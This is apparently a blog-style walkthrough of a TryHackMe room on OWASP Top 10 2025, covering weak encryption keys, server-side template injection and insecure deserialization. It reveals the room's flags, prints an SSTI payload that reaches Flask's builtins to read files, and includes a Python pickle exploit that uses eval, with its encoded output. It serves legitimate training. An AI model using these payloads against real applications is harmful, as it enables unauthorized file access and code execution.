# OWASP Top 10 2025: Insecure Data Handling TryHackMe walkthrough
95% through the path now! Today I bring to you this walkthrough (not going to repeat the topic it's too long).
## Task 1 Introduction
We will learn about elements relating to application behaviour and user input. And we will cover them, learn how to prevent them and try exploiting them!

Start the lab machine and the attack box attached. And check.

## Task 2 A04: Cryptographic failures

Basically, "Cryptographic failures happen when sensitive data isn't adequately protected due to lack of encryption, faulty implementation, or insufficient security measures."

We can prevent them by choosing strong, modern algorithms and implementing them properly. 

With that bit of background info, we jump in:

Go to
 
 `http://<LAB_MACHINE_IP>:8001`

We see something like this:
<img width="1480" height="1336" alt="image" src="https://github.com/user-attachments/assets/8ee59af6-3740-4060-87fd-69c390ecfacd" />

_Decrypt the encrypted notes. One of them will contain a flag value. What is it?_

This is easy:

Since the key is just four characters, and the key includes both numbers and letters, the last character is certainly a number.

By manually trying we get the key:

**KEY1**

and decrypt.

We see the flag in confidential 3:

<img width="684" height="814" alt="image" src="https://github.com/user-attachments/assets/335e38f5-9e14-473f-b641-304c8f4cb63d" />

**THM{WEAK_CRYPTO_FLAG}**

## Task 3 A05: Injection

Key points to know:

Injection occurs when an application takes user input and mishandles it.

Prevent injection by ensuring that user input is always treated as untrusted.

Going to the practical part:

`http://<LAB_MACHINE_IP>:8000`

Open this URL in a browser.

_Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application._

Basically this is about SSTI injection:

1 We make sure the thing is injectable:

`{{ 7 * 7 }}`

<img width="657" height="1432" alt="image" src="https://github.com/user-attachments/assets/928399c8-d3c1-41bd-b781-f4be9e389f99" />


We see the output 49. So it is injectable.


2 Discover the objects that are exposed to the template.

`{{ config.items() }}`

The output I got:

`dict_items([('DEBUG', True), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)]) `

3 Read the flag:

Now we have the objects listed, and so we read the flag:

`{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}`

Request.application leads to Flask internals, allowing youto reach the raw __builtins__ namespace and call open().

So we got the flag:

**THM{SSTI_FLAG_OBTAINED}**

## Task 4 A08: Software or Data Integrity Failures

So Software or Data Integrity Failures occur when an application relies on code, updates, or data it assumes are safe, without verifying their authenticity, integrity, or origin.

And how to avoid them:

"Preventing these failures begins with establishing trust boundaries."

_Use Python to pickle a malicious, serialised payload that reads the contents of flag.txt and submits it to the application.
What are the contents of flag.txt?_

Go to the url:

`http://<LAB_MACHINE_IP>:8002`

Upon clicking on "Toggle solution", we see the provided python script for payload creation.

<img width="1405" height="1361" alt="image" src="https://github.com/user-attachments/assets/c7d36c1d-b6d3-4c03-9ce3-37d1ccd77e85" />

Simply copying the code, and in terminal:

`nano script.py`

(Open a text editor)

We see the interface, then we copy the code:
```
import pickle 
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)


# Copy the output and paste it into the form
```

Then control X and Y to save.

We run

`python3 script.py`

and we see the generated payload:

`gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=`

<img width="744" height="796" alt="image" src="https://github.com/user-attachments/assets/34e2d641-b28c-413b-b415-9ef1c8194bfc" />

Deserialise, and the flag:

**THM{INSECURE_DESERIALIZATION}**

Juat like that, and we are done! Thank you for reading this whole thing, and if you found this helpful please star this respo. Look forward to seeing you all in the next room.

